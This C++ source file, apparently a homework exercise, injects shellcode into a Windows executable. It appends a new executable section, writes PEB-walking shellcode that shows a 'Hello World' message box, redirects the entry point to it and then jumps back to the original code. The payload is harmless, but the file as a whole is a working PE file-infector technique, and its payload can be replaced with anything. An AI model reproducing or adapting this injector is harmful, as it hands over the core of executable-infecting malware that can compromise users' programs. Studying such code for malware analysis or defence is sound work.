#include<Windows.h>
#include<iostream>
#include<iomanip>
using namespace std;

HANDLE hFile;
int numberSection, imageBase, OEP, lfanew1, szFile, sectionAlign, fileAlign, sectionSize, OEP_new, imageSize;
char buff[1000], jmpOEP[100], sectionName[8] = "NEWS";

int char2int(int i = 0, int cnt = 4){
	/* 4 byte char =>> 1 int*/
	int a = 0;
	for (int j = cnt-1; j > 0; --j) {
		a |= (unsigned char)(buff[j]);
		a <<= 8;
	}
	a |= (unsigned char)(buff[0]);
	return a;
}

void int2char(int n = 175, int cnt = 4) {
	memset(buff, 1, sizeof(buff));
	if (cnt == 2) {
		for (int i = cnt - 1; i > 0; --i) {
			buff[i] = (n >> 8) & 0xFF;
		}
		buff[0] = n & 0xFF;
	}
	if (cnt == 4) {
		buff[3] = (n >> 24) & 0xFF;
		buff[2] = (n >> 16) & 0xFF;
		buff[1] = (n >> 8) & 0xFF;
		buff[0] = n & 0xFF;
	}
}

void getBuf(int index, int byteRead = 4) {
	SetFilePointer(hFile, index, NULL, FILE_BEGIN);
	if (!ReadFile(hFile, buff, byteRead, NULL, NULL)) {
		cout << "Read Failed " << endl;
		return ;
	}
}

void overWrite(int index, int byteWrite) {
	SetFilePointer(hFile, index, NULL, FILE_BEGIN);
	if (!WriteFile(hFile, buff, byteWrite, NULL, NULL)) {
		cout << "Write Failed " << endl;
		return;
	}
}

void jmpOEP_f(int OEP) {
	jmpOEP[0] = '\xb8';
	int2char(OEP + imageBase, 4);
	int i = 1;
	for (i = 1; i <= 4; ++i)	jmpOEP[i] = buff[i - 1];
	jmpOEP[5] = '\xFF';	jmpOEP[6] = '\xE0';
}

void fillSectionHeader(int peHeader) {
	int VA, lastVA, lastVSz;
	char characteristics[5] = "\xE0\x00\x00\x60";
	peHeader += 0xF8;
	int tmp = 0x28 * (numberSection - 2);
	tmp += 8;
	getBuf(peHeader + tmp);
	lastVSz = char2int();
	tmp += 4;
	getBuf(peHeader + tmp);
	lastVA = char2int();

	tmp = lastVA + lastVSz;
	while (1) {
		if (tmp % sectionAlign == 0)	break;
		tmp++;
	}
	VA = tmp;
	OEP_new = VA;

	/*   Fill   */
	tmp = 0x28 * (numberSection - 1) + peHeader;
	SetFilePointer(hFile, tmp, NULL,NULL);
	WriteFile(hFile, sectionName, 8, NULL, NULL);
	int2char(sectionSize);
	WriteFile(hFile, buff, 4, NULL, NULL);
	int2char(VA);
	WriteFile(hFile, buff, 4, NULL, NULL);
	int2char(sectionSize);
	WriteFile(hFile, buff, 4, NULL, NULL);
	int2char(szFile);
	WriteFile(hFile, buff, 4, NULL, NULL);
	SetFilePointer(hFile, tmp + 36, NULL, NULL);
	WriteFile(hFile, characteristics, 4, NULL, NULL);
}

int main()
{
	sectionSize = 0x200;
	char space[0x500] = { 0 };
	// OPCODE hello world MessageBoxA
	char shellcode[] = "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
		"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
		"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
		"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
		"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
		"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
		"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
		"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
		"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
		"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
		"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
		"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
		"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
		"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
		"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
		"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
		"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
		"\xff\xd0";
	char fileName[] = "C:\\Users\\Admin\\source\\repos\\HomeWork\\b00.exe";
	cout << "Enter your file path(with \\\\) :";
	//cin >> fileName;
	hFile = CreateFileA(fileName, GENERIC_READ + GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "Failed1" << endl;
		return 0;
	}
	getBuf(60);
	lfanew1 = char2int();

	/*-------> Get ImageBase, Section Align, File Align, OEP  <-------------*/
	getBuf(lfanew1 + 40);
	OEP = char2int();
	getBuf(lfanew1 + 52);
	imageBase = char2int();
	getBuf(lfanew1 + 56);
	sectionAlign = char2int();
	getBuf(lfanew1 + 60);
	fileAlign = char2int();
	getBuf(lfanew1 + 80);
	imageSize = char2int();
	
	/* --->> change section number <<--- */
	getBuf(lfanew1 + 6);
	numberSection = char2int(0, 2);
	numberSection++;
	int2char(numberSection, 2);
	overWrite(lfanew1 + 6, 2);

	/* ---->> Add Opcode and Section Header <<------ */
	szFile = GetFileSize(hFile, NULL);
	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, space, sizeof(space), NULL, NULL);

	while (TRUE) {
		if (szFile % fileAlign == 0)	break;
		szFile++;
	}

	fillSectionHeader(lfanew1);

	SetFilePointer(hFile, szFile, NULL, NULL);
	WriteFile(hFile, shellcode, sizeof(shellcode)-1, NULL, NULL);
	jmpOEP_f(OEP);
	WriteFile(hFile, jmpOEP, 7, NULL, NULL);
	/*-------------------------------------------------*/
	int2char(OEP_new);
	overWrite(lfanew1 + 40, 4);
	int2char(imageSize + sectionAlign);
	overWrite(lfanew1 + 80, 4);

	CloseHandle(hFile);
	return 0;
}